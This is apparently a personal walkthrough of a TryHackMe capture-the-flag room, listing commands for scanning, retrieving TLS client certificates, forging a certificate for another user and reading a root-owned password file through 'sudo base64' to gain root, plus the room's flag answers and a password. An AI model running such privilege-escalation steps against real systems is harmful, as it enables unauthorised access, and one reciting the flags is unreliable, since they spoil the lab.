![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6244f6c52f56e10056a5f483/room-content/689b67cf1c8c5e1eb83c54b80360123b.jpg)

**Fred Flintstone   &   Barney Rubble!**  

Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

- He was able to establish `nginx` on port `80`,  redirecting to a custom TLS webserver on port `4040`
- There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
- There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
- Can you find all the Easter eggs?

_Please allow an extra few minutes for the VM to fully startup﻿._  

Answer the questions below

```
export IP=10.10.75.222
```

```
nmap -sC -sV -v -p- -oN scans/nmap $IP
```


![[Pasted image 20240617191620.png]]

```
socat TCP:$IP:9009 -
```

![[Pasted image 20240617191819.png]]


![[Pasted image 20240617191838.png]]


![[Pasted image 20240617191947.png]]


```
socat stdio ssl:10.10.35.201:54321,cert=certificate.crt,key=privateKey.key,verify=0
```

![[Pasted image 20240617192444.png]]

```
passwd
```

![[Pasted image 20240617192618.png]]


```
ssh barney@10.10.35.201
```

![[Pasted image 20240617192921.png]]

![[Pasted image 20240617192951.png]]


| Question                     | Answer                                |
| ---------------------------- | ------------------------------------- |
| What is the barney.txt flag? | THM{f05780f08f0eb1de65023069d0e4c90c} |

```
sudo -l
```


![[Pasted image 20240617193110.png]]


```
certutil ls
```

![[Pasted image 20240617193200.png]]


```
sudo certutil -a fred.csr.pem
```


![[Pasted image 20240617193255.png]]


```
socat stdio ssl:10.10.35.201:54321,cert=fredCert.crt,key=fredKey.key,verify=0
```

![[Pasted image 20240617193624.png]]


```
passwd
```

![[Pasted image 20240617193656.png]]


| Question                 | Answer           |
| ------------------------ | ---------------- |
| What is fred's password? | YabbaDabbaD0000! |


```
ssh fred@10.10.35.201
```

![[Pasted image 20240617193744.png]]


![[Pasted image 20240617193817.png]]

| Question                   | Answer                                |
| -------------------------- | ------------------------------------- |
| What is the fred.txt flag? | THM{08da34e619da839b154521da7323559d} |



```
sudo -l
```

![[Pasted image 20240617193936.png]]

```
sudo /usr/bin/base64 /root/pass.txt
```

![[Pasted image 20240617194106.png]]

![[Pasted image 20240617214658.png]]


![[Pasted image 20240617214714.png]]


```
su
```

![[Pasted image 20240617215745.png]]

![[Pasted image 20240617215837.png]]


| Question                   | Answer                                |
| -------------------------- | ------------------------------------- |
| What is the root.txt flag? | THM{de4043c009214b56279982bf10a661b7} |
